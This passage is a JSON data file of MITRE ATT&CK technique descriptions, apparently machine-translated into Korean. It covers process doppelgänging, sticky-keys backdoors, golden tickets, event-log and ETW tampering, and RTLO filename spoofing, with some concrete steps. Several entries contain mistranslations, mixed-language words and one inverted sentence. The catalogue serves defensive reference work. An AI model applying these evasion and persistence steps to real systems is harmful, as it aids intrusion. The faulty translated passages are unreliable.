직접 사용하는 것보다 더 큰 은폐 효과를 가질 수 있으며, 특히 로그가 역할 가장이 언제 이루어지는지 명확히 밝혀주지 않을 때 더욱 그렇습니다.",
    "external_id": "T1548.005",
    "modified": "2024-10-15T16:07:49.519Z",
    "translated": true
  },
  {
    "title": "Video Capture",
    "description": "공격자는 컴퓨터의 주변 장치(예: 통합 카메라나 웹캠)나 애플리케이션(예: 화상 통화 서비스)을 활용하여 정보를 수집하기 위한 비디오 녹화를 진행할 수 있습니다. 이미지 또한 장치나 애플리케이션에서 특정 간격으로 캡처될 수 있으며, 이는 비디오 파일 대신 제공될 수 있습니다.\n\n말웨어나 스크립트는 운영 체제나 애플리케이션이 제공하는 API를 통해 장치와 상호작용하여 비디오나 이미지를 캡처하는 데 사용될 수 있습니다. 비디오나 이미지 파일은 디스크에 저장된 후 나중에 유출될 수 있습니다. 이 기술은 피해자의 화면을 캡처하는 대신 특정 장치나 애플리케이션을 사용하여 비디오 녹화를 진행하기 때문에 [화면 캡처]와 구분됩니다.\n\nmacOS에서는 FruitFly와 Proton과 같은 사용자의 웹캠을 기록하는 몇 가지 다른 말웨어 샘플이 존재합니다.",
    "external_id": "T1125",
    "modified": "2023-03-30T21:01:37.205Z",
    "translated": true
  },
  {
    "title": "Process Doppelgänging",
    "description": "적대자들은 프로세스 기반 방어를 회피하고 권한을 상승시킬 가능성을 위해 프로세스 더블갱잉을 통해 프로세스에 악성 코드를 주입할 수 있습니다. 프로세스 더블갱잉은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nWindows 트랜잭셔널 NTFS(TxF)는 안전한 파일 작업을 수행하는 방법으로 Vista에 도입되었습니다. 데이터 무결성을 보장하기 위해 TxF는 주어진 시간에 파일에 쓸 수 있는 단 하나의 트랜잭션 핸들만을 허용합니다. 쓰기 핸들 트랜잭션이 종료될 때까지 모든 다른 핸들은 작성자로부터 격리되고 핸들이 열렸을 때 존재했던 파일의 커밋된 버전만 읽을 수 있습니다. TxF는 시스템이나 애플리케이션이 쓰기 트랜잭션 중 실패할 경우 자동 롤백을 수행하여 데이터 손상을 방지합니다.\n\n비록 사용이 중단되었지만, TxF 애플리케이션 프로그래밍 인터페이스(API)는 Windows 10에서도 여전히 활성화되어 있습니다. \n\n적대자들은 TxF를 악용하여 파일이 없는 변형의 프로세스 주입을 수행할 수 있습니다. 프로세스 홀로잉과 유사하게 프로세스 더블갱잉은 정당한 프로세스의 메모리를 교체하여 방어 및 탐지를 회피할 수 있는 악성 코드의 은닉 실행을 가능하게 합니다. 프로세스 더블갱잉의 TxF 사용은 또한 <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, <code>SetThreadContext</code>와 같은 고도로 모니터링되는 API 기능의 사용을 피합니다.\n\n프로세스 더블갱잉은 다음의 4단계로 구현됩니다:\n\n* 트랜잭트 – 정당한 실행 파일을 사용하여 TxF 트랜잭션을 생성한 다음 파일을 악성 코드로 덮어씁니다. 이러한 변경 사항은 격리되어 트랜잭션의 맥락 내에서만 볼 수 있습니다.\n* 로드 – 메모리의 공유 섹션을 생성하고 악성 실행 파일을 로드합니다.\n* 롤백 – 원래 실행 파일에 대한 변경 사항을 취소하여 파일 시스템에서 악성 코드를 효과적으로 제거합니다.\n* 애니메이트 – 오염된 메모리 섹션에서 프로세스를 생성하고 실행을 시작합니다.\n\n이 동작은 주입된 프로세스가 주입 프로세스에서 생성되었기 때문에 권한 상승을 초래하지 않을 가능성이 높습니다(따라서 보안 컨텍스트를 상속받습니다). 그러나 프로세스 더블갱잉을 통한 실행은 정당한 프로세스 아래에서 마스킹되기 때문에 보안 제품의 탐지를 피할 수 있습니다.",
    "external_id": "T1055.013",
    "modified": "2021-02-09T15:43:48.848Z",
    "translated": true
  },
  {
    "title": "System Network Configuration Discovery",
    "description": "적대자는 자신이 접근하는 시스템의 네트워크 구성 및 설정에 대한 세부정보, 예를 들어 IP 주소 및/또는 MAC 주소를 찾거나 원격 시스템에 대한 정보 검색을 통해 이를 알아낼 수 있습니다. 이 정보를 수집하는 데 사용할 수 있는 여러 운영 체제 관리 유틸리티가 존재합니다.\n\n적대자는 또한 네트워크 장치에서 CLI를 활용하여 구성 및 설정에 대한 정보를 수집할 수 있으며, 여기에는 설정된 인터페이스의 IP 주소 및 정적/동적 경로 정보가 포함됩니다.\n\n적대자는 자동화된 정보 발견 과정에서 시스템 네트워크 구성 발견의 정보를 활용하여 후속 행동을 결정하는 데 이를 사용할 수 있으며, 이는 특정 접근 권한을 판단하고 다음에 어떤 행동을 취할지 결정하는 데 도움이 됩니다.",
    "external_id": "T1016",
    "modified": "2023-07-28T14:40:54.580Z",
    "translated": true
  },
  {
    "title": "Delete Cloud Instance",
    "description": "적대자는 악의적인 활동을 수행한 후 클라우드 인스턴스를 삭제하여 탐지를 회피하고 자신의 존재에 대한 증거를 제거하려 할 수 있다. 인스턴스나 가상 머신을 삭제하면 해당 인스턴스를 복구할 수 없는 경우 귀중한 포렌식 아티팩트와 의심스러운 행동에 대한 다른 증거가 사라질 수 있다.\n\n적대자는 목표를 달성한 후 인스턴스를 생성하고 나중에 해당 인스턴스를 종료할 수도 있다.",
    "external_id": "T1578.003",
    "modified": "2024-09-30T13:28:37.415Z",
    "translated": true
  },
  {
    "title": "Code Repositories",
    "description": "적대자들은 표적 설정에 사용될 수 있는 피해자에 대한 정보를 찾기 위해 공개 코드 저장소를 검색할 수 있습니다. 피해자들은 GitHub, GitLab, SourceForge 및 BitBucket과 같은 다양한 제3자 웹사이트에 코드를 저장할 수 있습니다. 사용자는 일반적으로 웹 애플리케이션이나 git과 같은 명령줄 유틸리티를 통해 코드 저장소와 상호작용합니다.\n\n적대자들은 피해자에 대한 다양한 정보를 찾기 위해 여러 공개 코드 저장소를 검색할 수 있습니다. 공개 코드 저장소는 피해자에 대한 일반적인 정보, 예를 들어 일반적으로 사용되는 프로그래밍 언어 및 라이브러리, 직원의 이름 등을 제공할 수 있습니다. 적대자들은 또한 우연히 유출된 자격 증명이나 API 키와 같은 더 민감한 데이터를 식별할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 작업 기회를 드러낼 수 있으며, 운영 자원 설정이나 초기 접근을 가능하게 할 수 있습니다.\n\n**참고:** 이는 사설 및 내부 호스팅된 코드 저장소에서의 수집에 초점을 맞춘 코드 저장소와는 다릅니다.",
    "external_id": "T1593.003",
    "modified": "2022-10-26T18:01:20.520Z",
    "translated": true
  },
  {
    "title": "Executable Installer File Permissions Weakness",
    "description": "적대자는 설치 프로그램이 사용하는 이진 파일을 탈취하여 자신의 악성 페이로드를 실행할 수 있습니다. 이러한 프로세스는 기능의 일환으로 특정 이진 파일을 자동으로 실행하거나 다른 작업을 수행할 수 있습니다. 목표 이진 파일이 포함된 파일 시스템 디렉토리의 권한이나 이진 파일 자체의 권한이 잘못 설정되면, 목표 이진 파일은 사용자 수준 권한을 사용하여 다른 이진 파일로 덮어 씌워지고 원래 프로세스에 의해 실행될 수 있습니다. 원래 프로세스와 스레드가 더 높은 권한 수준으로 실행되는 경우, 교체된 이진 파일도 높은 수준의 권한으로 실행될 것이며, 여기에는 SYSTEM 권한도 포함될 수 있습니다.\n\n이 기술의 또 다른 변형은 실행 가능하고 스스로 압축을 푸는 설치 프로그램에서 공통적으로 발견되는 취약점을 이용하여 수행될 수 있습니다. 설치 과정 중 설치 프로그램이 DLL, EXE 또는 다른 페이로드와 같은 이진 파일을 압축 해제하기 위해 일반적으로 <code>%TEMP%</code> 디렉토리 내의 하위 디렉토리를 사용하는 경우가 많습니다. 설치 프로그램이 하위 디렉토리와 파일을 생성할 때 적절한 권한을 설정하여 쓰기 접근을 제한하지 않는 경우가 많아 신뢰할 수 없는 코드가 하위 디렉토리에 배치되거나 설치 과정에서 사용된 이진 파일이 덮어 쓰여질 수 있습니다.\n\n적대자는 이 기술을 사용하여 합법적인 이진 파일을 악성 파일로 교체함으로써 더 높은 권한 수준에서 코드를 실행할 수 있습니다. 일부 설치 프로그램은 적대자의 제어 코드를 실행할 때 권한 상승을 초래하는 상승된 권한을 요구할 수도 있습니다. 이러한 행동은 사용자 계정 컨트롤 우회와 관련이 있습니다. 기존의 일반 설치 프로그램에서 이러한 취약점의 여러 예가 소프트웨어 공급업체에 보고되었습니다. 실행 프로세스가 특정 시간이나 특정 이벤트(예: 시스템 부팅 중)에 실행되도록 설정되어 있는 경우, 이 기술은 지속성을 위해서도 사용될 수 있습니다.",
    "external_id": "T1574.005",
    "modified": "2020-03-26T19:20:23.030Z",
    "translated": true
  },
  {
    "title": "Accessibility Features",
    "description": "적대자는 접근성 기능에 의해 트리거되는 악성 콘텐츠를 실행함으로써 지속성을 유지하고/또는 권한을 상승시킬 수 있습니다. Windows에는 사용자가 로그인하기 전, 예를 들어 Windows 로그인 화면에 있을 때, 키 조합으로 실행할 수 있는 접근성 기능이 포함되어 있습니다. 적대자는 이러한 프로그램을 실행하는 방식을 수정하여 시스템에 로그인하지 않고도 명령 프롬프트나 백도어를 얻을 수 있습니다.\n\n두 가지 일반적인 접근성 프로그램은 Shift 키를 다섯 번 누르면 실행되는 프로그램과 Windows + U 키 조합을 누르면 실행되는 프로그램입니다. 첫 번째 프로그램은 일반적으로 \"스티키 키\"라고 불리며, 원격 데스크톱 로그인 화면을 통해 인증되지 않은 접근을 위해 적대자들이 사용해 왔습니다.\n\nWindows 버전에 따라 적대자는 이러한 기능을 다양한 방식으로 활용할 수 있습니다. 일반적으로 사용되는 방법에는 접근성 기능 이진 파일 또는 이러한 이진 파일에 대한 포인터/참조를 레지스트리에서 교체하는 것이 포함됩니다. 최신 버전의 Windows에서는 교체된 이진 파일이 x64 시스템에서 디지털 서명되어야 하며, 이진 파일은 시스템 디렉토리에 있어야 하고, Windows 파일 또는 리소스 보호(WFP/WRP)로 보호되어야 합니다. [이미지 파일 실행 옵션 주입](https://attack.mitre.org/techniques/T1546/012) 디버거 방법은 해당 접근성 기능 이진 파일을 교체할 필요가 없기 때문에 잠재적인 우회 방법으로 발견되었을 가능성이 있습니다.\n\n예를 들어 Windows XP 및 그 이후 버전, 그리고 Windows Server 2003/R2 및 이후 버전에서는 프로그램(예: \"C:\\Windows\\System32\\utilman.exe\")을 \"cmd.exe\"(또는 백도어 접근을 제공하는 다른 프로그램)로 교체할 수 있습니다. 이후 로그인 화면에서 적절한 키 조합을 누르면 교체된 파일이 SYSTEM 권한으로 실행됩니다.\n\n유사한 방식으로 활용될 수 있는 다른 접근성 기능도 존재합니다:\n\n* 화면 키보드: C:\\Windows\\System32\\osk.exe\n* 확대기: C:\\Windows\\System32\\Magnify.exe\n* 내레이터: C:\\Windows\\System32\\Narrator.exe\n* 디스플레이 전환기: C:\\Windows\\System32\\DisplaySwitch.exe\n* 앱 전환기: C:\\Windows\\System32\\AtBroker.exe",
    "external_id": "T1546.008",
    "modified": "2023-04-21T12:33:18.602Z",
    "translated": true
  },
  {
    "title": "Account Discovery",
    "description": "적대 세력은 시스템이나 침해된 환경에서 유효한 계정, 사용자 이름 또는 이메일 주소 목록을 얻으려 할 수 있습니다. 이 정보는 적대 세력이 어떤 계정이 존재하는지를 파악하는 데 도움을 줄 수 있으며, 이는 무차별 대입 공격, 표적 피싱 공격 또는 계정 탈취와 같은 후속 행동에 도움이 될 수 있습니다.\n\n적대 세력은 계정을 열거하기 위해 기존 도구의 남용, 내장 명령어, 그리고 타겟 환경에서 계정 이름 및 역할이나 권한을 누출하는 잠재적 잘못된 구성 등을 포함한 여러 방법을 사용할 수 있습니다.\n\n예를 들어, 클라우드 환경은 일반적으로 사용자 목록을 얻기 위한 쉽게 액세스할 수 있는 인터페이스를 제공합니다. 호스트에서는 적대 세력이 기본 PowerShell 및 기타 명령줄 기능을 사용하여 계정을 식별할 수 있습니다. 이메일 주소 및 계정에 대한 정보는 감염된 시스템의 파일을 검색하여 추출할 수도 있습니다.",
    "external_id": "T1087",
    "modified": "2024-10-15T15:35:28.784Z",
    "translated": true
  },
  {
    "title": "Proxy",
    "description": "적대자는 연결 프록시를 사용하여 시스템 간의 네트워크 트래픽을 조정하거나 명령 및 제어 서버와의 네트워크 통신을 위한 중개자로 작용하여 자산에 대한 직접 연결을 피할 수 있습니다. 트래픽 리디렉션을 가능하게 하는 많은 도구들이 존재하며, 이를 통해 프로키 또는 포트 리디렉션을 사용할 수 있습니다. 적대자는 이러한 유형의 프록시를 사용하여 명령 및 제어 통신을 관리하고, 동시에 여러 개의 아웃바운드 네트워크 연결 수를 줄이며, 연결 손실에 대비한 탄력성을 제공하고, 피해자 간의 기존 신뢰할 수 있는 통신 경로를 이용해 의심을 피하기 위해 사용합니다. 또한 적대자는 여러 개의 프록시를 연결하여 악성 트래픽의 출처를 더욱 숨길 수 있습니다.\n\n적대자는 콘텐츠 전송 네트워크(CDN)의 라우팅 방식도 활용하여 명령 및 제어 트래픽을 프록시할 수 있습니다.",
    "external_id": "T1090",
    "modified": "2021-08-30T19:16:11.648Z",
    "translated": true
  },
  {
    "title": "Command and Scripting Interpreter",
    "description": "적대 세력은 명령어 및 스크립트 해석기를 악용하여 명령어, 스크립트 또는 바이너리를 실행할 수 있습니다. 이러한 인터페이스와 언어는 컴퓨터 시스템과 상호작용하는 방법을 제공하며 다양한 플랫폼에서 일반적으로 사용되는 기능입니다. 대부분의 시스템은 일부 기본 제공 명령줄 인터페이스 및 스크립팅 기능을 갖추고 있으며, 예를 들어 macOS와 Linux 배포판은 일부 유형의 유닉스 셸을 포함하고, Windows 설치는 Windows 명령 셸과 PowerShell을 포함합니다.\n\n또한 파이썬과 같은 크로스 플랫폼 해석기와 클라이언트 애플리케이션과 일반적으로 연관된 자바스크립트와 비주얼 베이직과 같은 해석기도 있습니다.\n\n적대 세력은 임의의 명령을 실행하는 수단으로 이러한 기술을 다양한 방식으로 악용할 수 있습니다. 명령어와 스크립트는 피해자에게 유인 문서로 전달되는 초기 접근 페이로드에 삽입되거나 기존 C2에서 다운로드된 2차 페이로드에 포함될 수 있습니다. 적대 세력은 또한 인터랙티브 터미널/셸을 통해 명령을 실행하거나 다양한 원격 서비스를 활용하여 원격 실행을 달성할 수 있습니다.",
    "external_id": "T1059",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Indicator Blocking",
    "description": "적대자는 일반적으로 센서에 의해 수집되고 분석되는 지표나 이벤트를 차단하려고 시도할 수 있습니다. 여기에는 이벤트 텔레메트리의 수집 및 흐름을 제어하는 설정을 조작하여, 악의적으로 리디렉션하거나 호스트 기반 센서(예: Windows 이벤트 추적(ETW))를 비활성화하는 것이 포함될 수 있습니다. 이러한 설정은 시스템의 구성 파일 및/또는 레지스트리에 저장될 수 있으며, PowerShell 또는 Windows 관리 도구와 같은 관리 유틸리티를 통해 접근할 수 있습니다.\n\n예를 들어, 적대자는 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code>에서 `File` 값을 수정하여 새로운 또는 다른 .evtx 로그 파일에 자신의 악의적인 행동을 숨길 수 있습니다. 이 작업은 시스템 재부팅이 필요하지 않으며 즉시 효과를 발휘합니다.\n\nETW 중단은 여러 방법으로 이루어질 수 있지만, 가장 직접적인 방법은 [PowerShell]의 <code>Set-EtwTraceProvider</code> cmdlet를 사용하여 조건을 정의하거나 레지스트리에 직접 인터페이스하여 변경을 수행하는 것입니다.\n\n네트워크 기반 지표 보고의 경우, 적대자는 중앙 분석을 방지하기 위해 보고와 관련된 트래픽을 차단할 수 있습니다. 이는 텔레메트리를 전달하는 로컬 프로세스를 중지하거나, 이벤트 집계를 담당하는 특정 호스트(예: 보안 정보 및 이벤트 관리(SIEM) 제품)로의 트래픽을 차단하는 호스트 기반 방화벽 규칙을 생성함으로써 이루어질 수 있습니다.\n\n리눅스 환경에서는, 적대자가 탐지 및 모니터링 기능을 억제하고 후속 행동을 촉진하기 위해 syslog 또는 nxlog와 같은 로그 처리 도구를 비활성화하거나 재구성할 수 있습니다.",
    "external_id": "T1562.006",
    "modified": "2024-02-14T21:50:32.531Z",
    "translated": true
  },
  {
    "title": "Employee Names",
    "description": "적대자는 타겟팅 과정에서 사용할 수 있는 직원 이름을 수집할 수 있습니다. 직원 이름은 이메일 주소를 추정하는 데 사용될 수 있으며, 다른 정찰 활동을 안내하거나 더 그럴듯한 유인을 만드는 데 도움을 줄 수 있습니다.\n\n적대자는 온라인이나 기타 접근 가능한 데이터 세트를 통해 직원 이름을 쉽게 수집할 수 있습니다. 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러내고, 운영 자원을 설정하며, 초기 접근을 확보하는 데 도움이 될 수 있습니다.",
    "external_id": "T1589.003",
    "modified": "2024-09-16T16:09:45.795Z",
    "translated": true
  },
  {
    "title": "Domain Trust Discovery",
    "description": "적대자는 Windows 다중 도메인/포레스트 환경에서 수평 이동 기회를 식별하는 데 사용할 수 있는 도메인 신뢰 관계에 대한 정보를 수집하려고 시도할 수 있습니다. 도메인 신뢰는 한 도메인이 다른 도메인의 인증 절차에 따라 자원에 대한 액세스를 허용하는 메커니즘을 제공합니다. 도메인 신뢰는 신뢰받는 도메인의 사용자가 신뢰하는 도메인의 자원에 접근할 수 있도록 합니다. 발견된 정보는 적대자가 SID-히스토리 삽입, 티켓 전달 및 케르보로스팅을 수행하는 데 도움이 될 수 있습니다. 도메인 신뢰는 `DSEnumerateDomainTrusts()` Win32 API 호출, .NET 메소드 및 LDAP를 사용하여 열거할 수 있습니다. Windows 유틸리티는 적대자가 도메인 신뢰를 열거하는 데 사용하는 것으로 알려져 있습니다.",
    "external_id": "T1482",
    "modified": "2022-06-16T19:18:22.305Z",
    "translated": true
  },
  {
    "title": "Golden Ticket",
    "description": "KRBTGT 계정 비밀번호 해시를 가진 공격자는 Kerberos 티켓 부여 티켓(TGT), 즉 황금 티켓을 위조할 수 있습니다. 황금 티켓은 공격자가 Active Directory의 모든 계정에 대한 인증 자료를 생성할 수 있게 합니다.\n\n황금 티켓을 사용하여 공격자는 특정 리소스에 접근할 수 있게 해주는 티켓 부여 서비스(TGS) 티켓을 요청할 수 있습니다. 황금 티켓은 공격자가 TGS를 얻기 위해 키 배포 센터(KDC)와 상호작용해야 합니다.\n\nKDC 서비스는 Active Directory 도메인의 일부인 모든 도메인 컨트롤러에서 실행됩니다. KRBTGT는 Kerberos 키 배포 센터(KDC) 서비스 계정으로, 모든 Kerberos 티켓을 암호화하고 서명하는 책임이 있습니다. KRBTGT 비밀번호 해시는 도메인 컨트롤러에 대한 특권 액세스를 통해 얻을 수 있습니다.",
    "external_id": "T1558.001",
    "modified": "2020-11-05T16:07:03.779Z",
    "translated": true
  },
  {
    "title": "Automated Exfiltration",
    "description": "적대자는 수집 과정에서 수집된 민감한 문서와 같은 데이터를 자동화된 처리를 통해 유출할 수 있습니다. \n\n자동화된 유출이 사용될 때, 정보가 네트워크 외부로 전송되는 다른 유출 기술도 적용될 가능성이 높습니다.",
    "external_id": "T1020",
    "modified": "2024-01-24T00:04:01.066Z",
    "translated": true
  },
  {
    "title": "Client Configurations",
    "description": "적대자들은 대상 공격을 위해 피해자의 클라이언트 구성에 대한 정보를 수집할 수 있습니다. 클라이언트 구성에 대한 정보에는 운영 체제/버전, 가상화, 아키텍처(예: 32비트 또는 64비트), 언어 및/또는 시간대와 같은 다양한 세부 정보와 설정이 포함될 수 있습니다.\n\n적대자들은 이 정보를 여러 가지 방법으로 수집할 수 있으며, 예를 들어 직접 수집 작업을 통해(예: 리스닝 포트, 서버 배너, 사용자 에이전트 문자열) 또는 정보를 수집하도록 설계된 악성 콘텐츠를 포함하는 사이트를 악용하여 수집할 수 있습니다. 클라이언트 구성에 대한 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해서도 적대자에게 노출될 수 있습니다(예: 구인 게시물, 네트워크 맵, 평가 보고서, 이력서 또는 구매 송장). 이 정보를 수집함으로써 다른 형태의 정찰을 위한 기회를 드러낼 수 있으며(예: 열린 웹사이트/도메인 검색 또는 열린 기술 데이터베이스 검색), 운영 자원을 구축하거나(예: 능력 개발 또는 능력 획득) 초기 접근을 생성할 수 있습니다(예: 공급망 손상 또는 외부 원격 서비스).",
    "external_id": "T1592.004",
    "modified": "2021-10-17T16:35:09.668Z",
    "translated": true
  },
  {
    "title": "Disable or Modify Cloud Firewall",
    "description": "적대자는 클라우드 환경 내에서 방화벽을 비활성화하거나 수정하여 클라우드 리소스에 대한 접근을 제한하는 제어를 우회할 수 있습니다. 클라우드 방화벽은 시스템 방화벽과는 별개입니다.\n\n클라우드 환경은 일반적으로 신뢰할 수 있는 IP 주소에서 예상되는 포트와 프로토콜을 통해 네트워크 활동만 허용하는 제한적인 보안 그룹과 방화벽 규칙을 사용합니다. 적대자는 적절한 권한을 가지고 있다면 피해자의 클라우드 환경에 접근을 허용하는 새로운 방화벽 규칙이나 정책을 도입하거나 클라우드 제어 평면에서 데이터 평면으로 옮길 수 있습니다. 예를 들어, 적대자는 기존 보안 그룹에 새로운 수신 규칙을 생성하거나 전혀 새로운 보안 그룹을 생성하여 클라우드에서 호스팅되는 인스턴스에 대한 TCP/IP 연결을 허용하는 스크립트나 유틸리티를 사용할 수 있습니다. 그들은 또한 악의적인 활동(예: 크립토마이닝)과 관련된 트래픽을 지원하기 위해 네트워킹 제한을 제거할 수 있습니다.\n\n클라우드 방화벽을 수정하거나 비활성화하면 적대자의 C2 통신, 측면 이동 및/또는 데이터 유출이 허용되지 않을 수 있습니다. 또한 자원에 대한 접근을 열기 위해 사용할 수도 있습니다.",
    "external_id": "T1562.007",
    "modified": "2024-10-16T19:38:57.374Z",
    "translated": true
  },
  {
    "title": "Right-to-Left Override",
    "description": "적 adversaries는 오른쪽에서 왼쪽으로의 오버라이드(RTLO 또는 RLO) 문자(U+202E)를 악용하여 문자열이나 파일 이름을 변 disguise하여 무해하게 보이도록 할 수 있습니다. RTLO는 다음에 오는 텍스트가 반대로 표시되도록 하는 비인쇄 유니코드 문자입니다. 예를 들어, <code>March 25 \\u202Excod.scr</code>라는 이름의 Windows 화면 보호기 실행 파일은 <code>March 25 rcs.docx</code>로 표시됩니다. <code>photo_high_re\\u202Egnp.js</code>라는 이름의 JavaScript 파일은 <code>photo_high_resj.png</code>로 표시됩니다.\n\n적 adversaries는 RTLO 문자를 사용하여 사용자가 무해한 파일 유형이라고 생각하게 속이는 수단으로 악용할 수 있습니다. 이 기술의 일반적인 사용은 침투형 피싱 첨부 파일/악성 파일과 함께 사용되며, 이는 최종 사용자와 방어자가 RTLO 문자를 표시하고 렌더링하는 방법을 모를 경우 속일 수 있습니다. RTLO 문자의 사용은 많은 타겟 침투 시도 및 범죄 행위에서 관찰되었습니다. RTLO는 Windows 레지스트리에서도 사용될 수 있으며, 여기서 regedit.exe는 반전된 문자를 표시하지만 기본적으로 명령줄 도구인 reg.exe는 그렇지 않습니다.",
    "external_id": "T1036.002",
    "modified": "2021-10-14T21:01:59.733Z",
    "translated": true
  },
  {
    "title": "Component Firmware",
    "description": "적대자는 시스템에 지속적으로 존재하기 위해 구성 요소 펌웨어를 수정할 수 있습니다. 일부 적대자는 컴퓨터 구성 요소를 위협하는 정교한 수단을 사용하여 운영 체제 및 주요 시스템 펌웨어나 BIOS 외부에서 적대자의 코드를 실행할 악성 펌웨어를 설치할 수 있습니다. 이 기법은 시스템 펌웨어와 유사할 수 있지만, 동일한 기능이나 무결성 검사 수준을 갖지 않는 다른 시스템 구성 요소나 장치에서 수행됩니다.\n\n악성 구성 요소 펌웨어는 일반적인 접근 유지 실패나 하드 디스크 재이미징에도 불구하고 시스템에 지속적인 접근을 제공할 수 있으며, 호스트 소프트웨어 기반 방어 및 무결성 검사에서 벗어날 수 있는 방법을 제공할 수 있습니다.",
    "external_id": "T1542.002",
    "modified": "2022-04-01T20:43:55.632Z",
    "translated": true
  },
  {
    "title": "Indicator Removal",
    "description": "적대자는 시스템 내에서 생성된 아티팩트를 삭제하거나 수정하여 자신의 존재에 대한 증거를 제거하거나 방어를 방해할 수 있습니다. 다양한 아티팩트는 적대자에 의해 생성되거나 적대자의 행동에 기인할 수 있습니다. 일반적으로 이러한 아티팩트는 다운로드된 파일의 문자열, 사용자 행동에서 생성된 로그, 방어자가 분석한 기타 데이터와 같은 모니터링된 이벤트와 관련된 방어 지표로 사용됩니다. 아티팩트의 위치, 형식 및 유형(예: 명령 또는 로그인 기록)은 종종 각 플랫폼에 특화되어 있습니다.\n\n이러한 지표의 제거는 이벤트 수집, 보고 또는 침입 활동 탐지에 사용되는 기타 프로세스에 방해가 될 수 있습니다. 이는 중요한 사건이 보고되지 않게 되어 보안 솔루션의 무결성을 저해할 수 있습니다. 이 활동은 발생한 일을 판단하기 위한 충분한 데이터 부족으로 인해 포렌식 분석 및 사고 대응에도 방해가 될 수 있습니다.",
    "external_id": "T1070",
    "modified": "2024-10-15T15:59:22.125Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "description": "적대 세력은 기존의 지휘 및 제어 채널과는 다른 대칭적으로 암호화된 네트워크 프로토콜을 통해 데이터를 유출함으로써 데이터를 도용할 수 있습니다. 데이터는 또한 주요 지휘 및 제어 서버에서 다른 네트워크 위치로 전송될 수 있습니다.\n\n대칭 암호화 알고리즘은 채널의 양쪽 끝에서 공유되거나 동일한 키/비밀 값을 사용하는 알고리즘입니다. 이는 데이터를 암호화하고 복호화하는 데 사용되는 값을 교환하거나 미리 합의하거나 소유해야 함을 의미합니다.\n\n비대칭 암호화를 사용하는 네트워크 프로토콜은 종종 키를 교환한 후 대칭 암호화를 이용하지만, 적대 세력은 수동으로 키를 공유하고 대칭 암호화 알고리즘(예: RC4, AES)을 구현할 수 있습니다. 이는 기본적으로 암호화된 프로토콜(예: HTTPS)에서 여러 겹의 암호화를 유발하거나, 일반적으로 암호화되지 않는 프로토콜(예: HTTP 또는 FTP)에서 암호화를 발생시킬 수 있습니다.",
    "external_id": "T1048.001",
    "modified": "2020-03-28T00:43:24.228Z",
    "translated": true
  },
  {
    "title": "Office Template Macros",
    "description": "적대자는 손상된 시스템에서 지속성을 얻기 위해 Microsoft Office 템플릿을 악용할 수 있습니다. Microsoft Office에는 일반적인 Office 응용 프로그램의 일부인 템플릿이 포함되어 있으며, 이는 스타일을 사용자화하는 데 사용됩니다. 응용 프로그램 내의 기본 템플릿은 응용 프로그램이 시작될 때마다 사용됩니다.\n\nOffice Visual Basic for Applications(VBA) 매크로는 기본 템플릿에 삽입될 수 있으며, 이를 통해 해당 Office 응용 프로그램이 시작될 때 코드를 실행하여 지속성을 얻을 수 있습니다. Word와 Excel 모두에 대한 예제가 발견되어 발표되었습니다. 기본적으로 Word에는 악성 매크로를 포함하도록 수정할 수 있는 Normal.dotm 템플릿이 생성됩니다. Excel은 기본적으로 템플릿 파일이 생성되지 않지만, 자동으로 로드될 하나를 추가할 수 있습니다. 공유 템플릿 또한 원격 위치에서 저장 및 가져올 수 있습니다.\n\nWord Normal.dotm 위치:  \nC:\\Users\\<사용자이름>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\n\nExcel Personal.xlsb 위치:  \nC:\\Users\\<사용자이름>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB\n\n적대자는 애플리케이션의 검색 순서를 탈취하여 기본 템플릿의 위치를 자신의 것으로 변경할 수도 있습니다. 예를 들어, Word 2016은 먼저 C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\ 아래에서 Normal.dotm을 찾습니다. 또는 GlobalDotName 레지스트리 키를 수정하여 이를 수행할 수 있습니다. GlobalDotName 레지스트리 키를 수정함으로써 적대자는 애플리케이션 시작 시 로드될 템플릿의 임의의 위치, 파일 이름 및 파일 확장자를 지정할 수 있습니다. GlobalDotName을 악용하기 위해서는 적대자가 먼저 템플릿을 신뢰할 수 있는 문서로 등록하거나 신뢰할 수 있는 위치에 배치해야 할 수 있습니다.\n\n적대자는 시스템이나 기업의 보안 정책에 따라 매크로가 unrestricted하게 실행되도록 매크로를 활성화해야 할 수도 있습니다.",
    "external_id": "T1137.001",
    "modified": "2024-10-15T16:01:35.918Z",
    "translated": true
  },
  {
    "title": "Confluence",
    "description": "적대 세력은 중요한 정보를 채굴하기 위해 Confluence 저장소를 활용할 수 있습니다. 일반적으로 Atlassian JIRA와 함께 개발 환경에서 발견되는 Confluence는 주로 개발 관련 문서를 저장하는 데 사용되지만, 일반적으로는 유용한 정보의 더 다양한 범주를 포함할 수 있습니다. 예를 들면:\n\n* 정책, 절차 및 표준\n* 물리적/논리적 네트워크 다이어그램\n* 시스템 아키텍처 다이어그램\n* 기술 시스템 문서\n* 테스트/개발 자격 증명\n* 작업/프로젝트 일정\n* 소스 코드 조각\n* 네트워크 공유 및 기타 내부 리소스에 대한 링크",
    "external_id": "T1213.001",
    "modified": "2024-08-30T13:45:42.840Z",
    "translated": true
  },
  {
    "title": "Pass the Ticket",
